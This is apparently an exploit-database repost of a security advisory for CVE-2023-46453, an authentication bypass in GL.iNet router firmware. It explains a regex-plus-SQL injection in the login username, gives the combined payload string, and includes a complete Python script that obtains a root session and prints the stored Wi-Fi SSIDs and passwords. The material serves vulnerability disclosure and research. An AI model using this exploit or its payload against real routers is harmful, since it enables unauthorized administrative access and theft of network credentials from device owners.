@@ -1,0 +1,283 @@
+id: 39428
+date: 03/06/2024
+title: GL.iNet - Router Authentication Bypass Exploit
+author: Daniele Linguaglossa
+cves: 
+
+DZONERZY Security Research
+
+GLiNet: Router Authentication Bypass
+
+========================================================================
+Contents
+========================================================================
+
+1. Overview
+2. Detailed Description
+3. Exploit
+4. Timeline
+
+========================================================================
+1. Overview
+========================================================================
+
+CVE-2023-46453 is a remote authentication bypass vulnerability in the web
+interface of GLiNet routers running firmware versions 4.x and up. The
+vulnerability allows an attacker to bypass authentication and gain access
+to the router's web interface.
+
+========================================================================
+2. Detailed Description
+========================================================================
+
+The vulnerability is caused by a lack of proper authentication checks in
+/usr/sbin/gl-ngx-session file. The file is responsible for authenticating
+users to the web interface. The authentication is in different stages.
+
+Stage 1:
+
+During the first stage the user send a request to the challenge rcp
+endpoint. The endpoint returns a random nonce value used later in the
+authentication process.
+
+Stage 2:
+
+During the second stage the user sends a request to the login rcp endpoint
+with the username and the encrypted password. The encrypted password is
+calculated by the following formula:
+
+md5(username + crypt(password) + nonce)
+
+The crypt function is the standard unix crypt function.
+
+The vulnerability lies in the fact that the username is not sanitized
+properly before being passed to the login_test function in the lua script.
+
+------------------------------------------------------------------------
+local function login_test(username, hash)
+    if not username or username == "" then return false end
+
+    for l in io.lines("/etc/shadow") do
+        local pw = l:match('^' .. username .. ':([^:]+)')
+        if pw then
+            for nonce in pairs(nonces) do
+                if utils.md5(table.concat({username, pw, nonce}, ":")) ==
+hash then
+                    nonces[nonce] = nil
+                    nonce_cnt = nonce_cnt - 1
+                    return true
+                end
+            end
+            return false
+        end
+    end
+
+    return false
+end
+------------------------------------------------------------------------
+
+This script check the username against the /etc/shadow file. If the username
+is found in the file the script will extract the password hash and compare
+it to the hash sent by the user. If the hashes match the user is
+authenticated.
+
+The issue is that the username is not sanitized properly before being
+concatenated with the regex. This allows an attacker to inject a regex into
+the username field and modify the final behavior of the regex.
+
+for instance, the following username will match the userid of the root user:
+
+root:[^:]+:[^:]+ will become root:[^:]+:[^:]+:([^:]+)
+
+
+This will match the "root:" string and then any character until the next ":"
+character. This will cause the script skip the password and return the
+user id instead.
+
+Since the user id of the root user is always 0, the script will always
+return:
+
+md5("root:[^:]+:[^:]+" + "0" + nonce)
+
+Since this value is always the same, the attacker can simply send the known
+hash value to the login rcp endpoint and gain access to the web interface.
+
+Anyway this approach won't work as expected since later in the code inside
+the
+this check appear:
+
+------------------------------------------------------------------------
+    local aclgroup = db.get_acl_by_username(username)
+
+    local sid = utils.generate_id(32)
+
+    sessions[sid] = {
+        username = username,
+        aclgroup = aclgroup,
+        timeout = time_now() + session_timeout
+    }
+------------------------------------------------------------------------
+
+The username which is now our custom regex will be passed to the
+get_acl_by_username
+function. This function will check the username against a database and
+return the aclgroup associated with the username.
+If the username is not found in the database the function will return nil,
+thus causing attack to fail.
+
+By checking the code we can see that the get_acl_by_username function is
+actually appending our raw string to a query and then executing it.
+This means that we can inject a sql query into the username field and
+make it return a valid aclgroup.
+
+------------------------------------------------------------------------
+M.get_acl_by_username = function(username)
+    if username == "root" then return "root" end
+
+    local db = sqlite3.open(DB)
+    local sql = string.format("SELECT acl FROM account WHERE username =
+'%s'", username)
+
+    local aclgroup = ""
+
+    for a in db:rows(sql) do
+        aclgroup = a[1]
+    end
+
+    db:close()
+
+    return aclgroup
+end
+------------------------------------------------------------------------
+
+Using this payload we were able to craft a username which is both a valid
+regex and a valid sql query:
+
+roo[^'union selecT char(114,111,111,116)--]:[^:]+:[^:]+
+
+this will make the sql query become:
+
+SELECT acl FROM account WHERE username = 'roo[^'union selecT
+char(114,111,111,116)--]:[^:]+:[^:]+'
+
+which will return the aclgroup of the root user (root).
+
+========================================================================
+3. Exploit
+========================================================================
+
+------------------------------------------------------------------------
+# Exploit Title: [CVE-2023-46453] GL.iNet - Authentication Bypass
+# Date: 18/10/2023
+# Exploit Author: Daniele 'dzonerzy' Linguaglossa
+# Vendor Homepage: https://www.gl-inet.com/
+# Vulnerable Devices:
+#   GL.iNet GL-MT3000 (4.3.7)
+#   GL.iNet GL-AR300M(4.3.7)
+#   GL.iNet GL-B1300 (4.3.7)
+#   GL.iNet GL-AX1800 (4.3.7)
+#   GL.iNet GL-AR750S (4.3.7)
+#   GL.iNet GL-MT2500 (4.3.7)
+#   GL.iNet GL-AXT1800 (4.3.7)
+#   GL.iNet GL-X3000 (4.3.7)
+#   GL.iNet GL-SFT1200 (4.3.7)
+#   And many more...
+# Version: 4.3.7
+# Firmware Release Date: 2023/09/13
+# CVE: CVE-2023-46453
+
+from urllib.parse import urlparse
+import requests
+import hashlib
+import random
+import sys
+
+
+def exploit(url):
+    try:
+        requests.packages.urllib3.disable_warnings()
+        host = urlparse(url)
+        url = f"{host.scheme}://{host.netloc}/rpc"
+        print(f"[*] Target: {url}")
+        print("[*] Retrieving nonce...")
+        nonce = requests.post(url, verify=False, json={
+            "jsonrpc": "2.0",
+            "id": random.randint(1000, 9999),
+            "method": "challenge",
+            "params": {"username": "root"}
+        }, timeout=5).json()
+        if "result" in nonce and "nonce" in nonce["result"]:
+            print(f"[*] Got nonce: {nonce['result']['nonce']} !")
+        else:
+            print("[!] Nonce not found, exiting... :(")
+            sys.exit(1)
+        print("[*] Retrieving authentication token for root...")
+        md5_hash = hashlib.md5()
+        md5_hash.update(
+            f"roo[^'union selecT
+char(114,111,111,116)--]:[^:]+:[^:]+:0:{nonce['result']['nonce']}".encode())
+        password = md5_hash.hexdigest()
+        token = requests.post(url, verify=False, json={
+            "jsonrpc": "2.0",
+            "id": random.randint(1000, 9999),
+            "method": "login",
+            "params": {
+                "username": f"roo[^'union selecT
+char(114,111,111,116)--]:[^:]+:[^:]+",
+                "hash": password
+            }
+        }, timeout=5).json()
+        if "result" in token and "sid" in token["result"]:
+            print(f"[*] Got token: {token['result']['sid']} !")
+        else:
+            print("[!] Token not found, exiting... :(")
+            sys.exit(1)
+        print("[*] Checking if we are root...")
+        check = requests.post(url, verify=False, json={
+            "jsonrpc": "2.0",
+            "id": random.randint(1000, 9999),
+            "method": "call",
+            "params": [token["result"]["sid"], "system", "get_status", {}]
+        }, timeout=5).json()
+        if "result" in check and "wifi" in check["result"]:
+            print("[*] We are authenticated as root! :)")
+            print("[*] Below some info:")
+            for wifi in check["result"]["wifi"]:
+                print(f"[*] --------------------")
+                print(f"[*] SSID: {wifi['ssid']}")
+                print(f"[*] Password: {wifi['passwd']}")
+                print(f"[*] Band: {wifi['band']}")
+            print(f"[*] --------------------")
+        else:
+            print("[!] Something went wrong, exiting... :(")
+            sys.exit(1)
+    except requests.exceptions.Timeout:
+        print("[!] Timeout error, exiting... :(")
+        sys.exit(1)
+    except KeyboardInterrupt:
+        print(f"[!] Something went wrong: {e}")
+
+
+if __name__ == "__main__":
+    print("GL.iNet Auth Bypass\n")
+    if len(sys.argv) < 2:
+        print(
+            f"Usage: python3 {sys.argv[1]} https://target.com",
+file=sys.stderr)
+        sys.exit(0)
+    else:
+        exploit(sys.argv[1])
+------------------------------------------------------------------------
+
+========================================================================
+4. Timeline
+========================================================================
+
+2023/09/13 - Vulnerability discovered
+2023/09/14 - CVE-2023-46453 requested
+2023/09/20 - Vendor contacted
+2023/09/20 - Vendor replied
+2023/09/30 - CVE-2023-46453 assigned
+2023/11/08 - Vulnerability patched and fix released
+
+#  0day.today [2024-03-15]  #
